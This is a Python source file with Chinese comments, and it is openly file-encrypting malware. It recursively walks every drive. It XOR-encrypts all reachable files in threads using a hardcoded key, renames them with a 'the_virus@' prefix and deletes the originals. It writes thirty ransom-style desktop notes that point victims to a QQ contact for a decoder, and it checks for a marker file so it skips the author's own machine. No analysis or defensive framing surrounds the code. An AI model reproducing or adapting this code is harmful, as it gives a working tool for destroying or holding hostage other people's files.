#加密文件的程序，会加密所有可加密的文件
r"""
import os, string, threading

def key_path():
	"""需要创建并用作判断的文件或文件夹的路径"""
	change_name = os.path.expanduser('~')						#得到通用路径c:\users\用户名
	key_path_1 = r'%s\Documents\System' %(change_name)				#第一个目标路径
	key_path_2 = r'%s\Pictures\下载的图片' %(change_name)				#第二个目标路径
	key_path_3 = r'%s\Videos\Download' %(change_name)				#第三个目标路径
	return key_path_1, key_path_2, key_path_3					#返回三个路径并存至列表

def get_desktop_path():
	"""得到桌面的目标路径"""
	change_name = os.path.expanduser('~')						#得到通用路径c:\users\用户名 
	desktop_path = r'%s\desktop\Read_me.txt' %(change_name)				#拼接路径得到桌面路径
	return desktop_path								#返回完整绝对路径以备使用

def read_me():
	"""在桌面生成的自述文件"""	
	desktop_path = get_desktop_path()						#得到桌面路径
	answer = ('''
################################################################
################################################################
################################################################
#######	  自述文件						
#######	  您可能需要获取帮助？					
#######								
#######	  特别重要的说明：为了您文件的可逆性和完整性，请您	
#######	  不要擅自修改文件的扩展名以及文件名且更加不能修改	
#######	  文件的内容,即便文件的内容已经无法直视!如果您想试	
#######	  着双击打开看看，那倒是没有任何问题的!	   	
#######								
#######	  如果您还有任何疑问，可以继续往下阅读：		
#######								
#######	  1.我的电脑怎么了？					
#######	  ————	您的计算机上的大部分文件被我加密保存起来了	
#######   图片格式,视频格式,音频格式乃至文本文档格式。几乎	
#######	  所有类型的文件都被加密导致无法正常使用了。如果您	
#######	  仍然不相信，大可尝试打开一些文件来应验我到底有没	
#######	  有骗您。						
#######								
#######	  2.要怎么样恢复这些文件？				
#######	  ————	假如您没有直接关闭电脑，而等待程序运行完成	
#######	  那么是可以进行逆向解密的。但如果您在该程序运行途	
#######	  中进行各种不友好的操作从而导致程序异常关闭，那么	
#######	  就没有解密的必要了。因为如果发生这种状况，我可以	
#######	  向您保证，就算是神仙来了也没有用！			
#######								
#######	  3.那么我需要做什么？					
#######	  ————	联系此程序作者，可以免费获得解码程序，在此	
#######	  祝您:解密成功！					
#######								
#######	  联系方式：		2396454934     (QQ)			
#######								
#######	  特别重要的说明：为了您文件的可逆性和完整性，请您	
#######	  不要擅自修改文件的扩展名以及文件名且更加不能修改	
#######	  文件的内容,即便文件的内容已经无法直视!如果您想试	
#######	  着双击打开看看，那倒是没有任何问题的!		
#######								
################################################################
################################################################
################################################################
		''') 									#文件内容
	lists_path = os.path.splitext(desktop_path)					#得到目标路径文件名和扩展名
	for i in range(1, 31):								#循环30次用于改变文件名
		i = str(i)								#将整形变量转为字符串类型
		aim_path = lists_path[0] + '_' + i					#拼接得到新的文件名
		new_desktop_path = aim_path + lists_path[1]				#拼接后缀名得到新的文件路径
		with open(new_desktop_path, 'w') as f:					#以写入方式打开文件
			f.write(answer)							#将内容写入文件

def aims_path(the_aim):
	"""递归遍历文件目录和所有文件,如
	果是文件则进行加密操作"""
	try:										#尝试打开目标路径的文件夹
		files = os.listdir(the_aim)						#遍历目标路径并将其存在列表中	
		for file in files:							#遍历列表
			new_path = os.path.join(the_aim, file)				#拼接成新路径
			if os.path.isdir(new_path):					#判断是否是文件夹
				aims_path(new_path)					#如果是文件夹则重新调用此函数
			else:								#否则则为文件
				file_name = os.path.split(new_path)			#拆分文件名和扩展名并放入列表
				answer = file_name[1]					#得到目标文件名
				if answer[:10] == 'the_virus@':				#将文件名的前9个字符和'the_virus@'比较
					pass						#如果相等则代表文件已经被加密
				else: 							#否则未被加密
					encryption_thread = threading.\
					Thread(target=encryption, args=(new_path,)) 			
					encryption_thread.start()
	except Exception:								#如果无法打开目标路径的文件夹
		pass									#则忽略此文件夹

def encryption(file_path):
	"""用于加密文件的代码块"""
	try:									
		key_date = b'He who makes no mistakes makes nothing. --2021/1/17'					
		len_key_date = 51
		key_name = 'the_virus@'							
		answer = os.path.split(file_path)					
		new_name = os.path.join(answer[0], key_name)				
		the_full_path = new_name + answer[1]						
		with open(file_path, 'rb') as f:
			with open(the_full_path, 'wb') as w:					
				while 1:
					stream_bytes = f.read(1024)
					if not stream_bytes:
						break
					else:
						len_stream_bytes = len(stream_bytes)										
						finally_key = len_stream_bytes // 51 *\
						key_date + key_date[:len_stream_bytes % 51]								
						for i in range(len_stream_bytes):				
							new_stream_bytes = finally_key[i] ^ stream_bytes[i]	
							w.write(bytes([new_stream_bytes]))
		os.remove(file_path)
	except Exception:
		pass

def get_disklist():
	'''获得计算机所有盘符'''
	disk_list = []									#创建一个空列表用于存储盘符
	for i in string.ascii_uppercase:						#遍历ascii码从中得到值
		disk = i + ':'								#和':'进行拼接得到盘符
		if os.path.isdir(disk):							#判断是否是盘符文件夹
			disk_list.append(disk)						#如果是盘符则将其追加到列表中
	disk_list.sort(reverse = True)							#逆序排列盘符
	return disk_list								#返回存储了盘符的列表以备使用
	
#启动/主函数
if __name__ == '__main__':								#防止调用此模块时自动启动主函数
	Safety_inspection = r"C:\Windows\Password.txt"  				#用于安全检测的路径
	key_answer = key_path()								#得到存储目标路径的列表
	key_file_1 = key_answer[0] 							#第一个目标路径
	key_file_2 = key_answer[1]							#第二个目标路径
	key_file_3 = key_answer[2]							#第三个目标路径
	answer = os.path.exists(Safety_inspection)					#得到检测的答案
	answer_1 = os.path.exists(key_file_1)						#判断是否存在第一个路径
	answer_2 = os.path.exists(key_file_2)						#判断是否存在第二个路径
	answer_3 = os.path.exists(key_file_3)						#判断是否存在第三个路径
	if answer == True:								#如果是自己的计算机
		pass									#跳过不执行操作
	elif answer_1 == True or answer_2 == True and answer_3 == True:			#只要存在任意一个文件夹
		pass									#则不执行任何操作
	else:										#如果不是自己的计算机
		disk_lists = get_disklist()						#得到计算机所有盘符的列表
		for disk_list in disk_lists:						#遍历列表得到单个盘符
			aims_path(disk_list) 						#执行递归遍历和加密操作
		try:									#尝试创建文件夹
			os.mkdir(key_file_1)						#创建第一个文件夹
			os.mkdir(key_file_2)						#创建第二个文件夹
			os.mkdir(key_file_3)						#创建第三个文件夹
		except Exception:							#创建失败
			pass								#跳过
		else:									#一定要进行的操作
			read_me()							#调用程序在桌面生成文件
"""